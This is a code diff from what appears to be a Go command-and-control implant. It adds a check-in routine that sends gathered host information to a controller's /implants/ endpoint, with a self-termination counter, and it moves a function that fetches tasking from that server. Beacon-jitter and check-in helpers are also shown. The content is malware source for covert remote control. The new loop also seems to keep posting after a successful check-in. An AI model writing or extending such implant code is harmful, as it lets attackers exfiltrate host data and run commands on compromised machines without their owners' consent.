@@ -69,19 +69,17 @@ func GatherInfo() InitialInfo {
 	return hostInfo
 }
 
-func FetchTasking(serverAddr string, session string) (string, error) {
-	url := fmt.Sprintf("%s/tasks/%s", serverAddr, session)
-
-	resp, err := CustomClient.Get(url)
-	if err != nil {
-		return "", err
+func InitialCheckin(serverUrl string, initialInfo InitialInfo) {
+	for i := 0; i <= CallbackTimer.SelfTerminate; i++ {
+		if i >= CallbackTimer.SelfTerminate {
+				TerminateImplant()
+		}
+		resp, err := PostJson(serverUrl+"/implants/", initialInfo)
+		if err != nil || resp != 200 {
+			
+			time.Sleep(60 * time.Second)
+		}
 	}
-	defer resp.Body.Close()
-	bodyBytes, err := io.ReadAll(resp.Body)
-	if err != nil {
-		return "", err
-	}
-	return string(bodyBytes), nil
 }
 
 func CheckIn(serverAddr string, session string) (int, error) {
@@ -106,6 +104,21 @@ func CheckIn(serverAddr string, session string) (int, error) {
 	}
 	defer resp.Body.Close()
 	return resp.StatusCode, nil
+}
+
+func FetchTasking(serverAddr string, session string) (string, error) {
+	url := fmt.Sprintf("%s/tasks/%s", serverAddr, session)
+
+	resp, err := CustomClient.Get(url)
+	if err != nil {
+		return "", err
+	}
+	defer resp.Body.Close()
+	bodyBytes, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return "", err
+	}
+	return string(bodyBytes), nil
 }
 
 func RandomJitter(baseMinutes int, jitterPercent int) time.Duration {
